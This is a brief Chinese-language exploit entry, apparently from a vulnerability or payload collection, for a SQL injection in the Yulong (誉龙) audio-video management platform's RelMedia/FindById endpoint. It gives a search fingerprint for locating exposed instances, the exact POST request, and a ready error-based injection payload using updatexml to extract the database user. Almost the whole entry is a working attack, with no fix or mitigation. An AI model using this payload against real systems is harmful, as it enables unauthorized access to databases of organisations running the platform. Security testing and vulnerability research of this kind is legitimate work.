# 誉龙视音频综合管理平台RelMediaFindByIdSQL注入漏洞

誉龙视音频综合管理平台RelMediaFindById ｜ SQL注入 ｜ —
- **指纹**：`body="PView 视音频管理平台"`
- **请求**：`POST /index.php?r=RelMedia/FindById HTTP/1.1`

**Payload**
```
id=1+and+updatexml(1,concat(0x7e,user(),0x7e),1)--+
```
- **响应特征**：200